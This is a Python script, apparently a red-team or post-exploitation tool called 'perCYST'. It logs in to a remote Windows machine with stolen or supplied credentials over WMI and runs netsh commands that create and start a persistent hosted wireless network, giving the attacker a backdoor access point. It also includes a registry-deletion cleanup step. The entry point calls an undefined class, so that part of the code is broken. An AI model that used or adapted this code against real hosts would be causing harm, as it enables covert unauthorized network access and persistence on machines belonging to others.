import subprocess
import sys
import wmiexec


# Author: Steve Laura

class netshWirelessBackdoor:

    def __init__(self, ip, username, password, share):
        self.ip = ip
        self.username = username
        self.passwd = password
        self.share = share


    def setPercyst(self):

        ssid = raw_input("[!] Enter a name for the SSID to create: ")
        key = raw_input("[!] Enter a key for access to the SSID (Make sure it is at least 8 characters) ")

        while len(key) < 8:
            print('[!] The key needs to be at least 8 characters!')
            key = raw_input("[!] Enter a key for access to the SSID (Make sure it is at least 8 characters) or Enter Q to quit: ")
            if key.lower() == 'q':
                sys.exit()

        cmd = 'netsh wlan set hostednetwork mode=allow && netsh wlan set hostednetwork ssid=' + ssid + ' && netsh wlan set hostednetwork key=' + key + ' keyUsage=persistent && netsh wlan start hostednetwork'
        self.runCmd(cmd)

        #If want to show SSIDs from command line
        #nmcli dev wifi list


    def cleanup(self):
        cmd = 'REG DELETE "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WlanSvc\\Parameters\\HostedNetworkSettings" /f'
        netshWirelessRemove = self.runCmd(cmd)
        print('Removing the Registry key of HostedNetworkSettings, please note that the hostednetwork will not be removed until the system is rebooted!\n')


    def runCmd(self, cmd):
        print("[+] Cyst attaching to host")
        execute1 = wmiexec.WMIEXEC(command=cmd, username=self.username, password=self.passwd, share=self.share)#, noOutput=True)
        execute1.run(self.ip)


    def ascii(self):
        print('perCYST\n\n<INSERT ASCII ART HERE>\n\n')


if __name__ == '__main__':
    RegRun().ascii()
